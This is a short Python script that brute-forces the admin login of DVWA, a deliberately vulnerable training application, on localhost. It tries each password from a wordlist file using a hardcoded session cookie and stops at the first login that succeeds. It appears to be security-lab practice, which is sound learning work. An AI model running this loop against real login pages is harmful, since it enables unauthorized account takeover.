import requests

if __name__ == '__main__':
    # Load from file with passwords
    list_passwords = []
    with open("password_file.txt", "r") as file:
        for readline in file:
            line_strip = readline.strip()
            list_passwords.append(line_strip)
    # Sometimes need to update PHPSESSID (html code -> network -> cookies)
    cookies = {'security': 'low', 'PHPSESSID': 'c5t7d7g5pshtbt9daeb4nhp6fa'}
    for password in list_passwords:
        request = requests.get(
            f'http://localhost/dvwa/vulnerabilities/brute/?username=admin&password={password}&user_token=TOKEN&Login'
            f'=Login',
            auth=('admin', 'password'), verify=False, cookies=cookies)
        if "Username and/or password incorrect." not in request.text:
            # print(request.text)
            print(f"Login = admin, Correct password = {password}")
            break
